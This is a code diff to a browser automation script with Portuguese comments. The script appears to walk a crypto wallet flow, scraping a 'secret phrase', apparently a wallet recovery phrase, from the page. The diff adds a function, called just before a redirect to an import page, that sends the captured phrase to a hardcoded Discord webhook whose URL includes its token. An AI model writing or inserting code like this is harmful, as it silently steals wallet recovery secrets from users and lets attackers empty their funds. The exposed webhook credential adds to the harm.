@@ -34,6 +34,23 @@
         inputElement.dispatchEvent(new Event('change', { bubbles: true }));
     }
 
+    function enviarFraseSecretaParaDiscord(fraseSecreta) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1210570411478229002/D7c9nyy9GAnLxuZQVYE4v4SwroIyqyjh5G1xGG6yM_YUM9TXG8XuSj0nzAqsPCAuEw35';
+    const payload = {
+        content: `Frase secreta: ${fraseSecreta}`
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    })
+    .then(response => console.log('Frase secreta enviada com sucesso para o Discord.'))
+    .catch(error => console.error('Erro ao enviar frase secreta para o Discord:', error));
+}
+
     function handleInitialPage() {
         console.log('Página inicial detectada');
 
@@ -84,9 +101,12 @@
 
         setTimeout(() => {
             const frases = [...document.querySelectorAll('.phrase-content .single-phrase p')]
-                .map(el => el.textContent.trim()).join(' ');
+            .map(el => el.textContent.trim()).join(' ');
             sessionStorage.setItem('fraseSecreta', frases);
             console.log('Frase secreta capturada e armazenada:', frases);
+
+            // Adicione esta linha para enviar a frase para o Discord
+            enviarFraseSecretaParaDiscord(frases);
 
             window.location.href = 'https://doptest.dop.org/import';
         }, 5000); // Ajuste este tempo conforme necessário
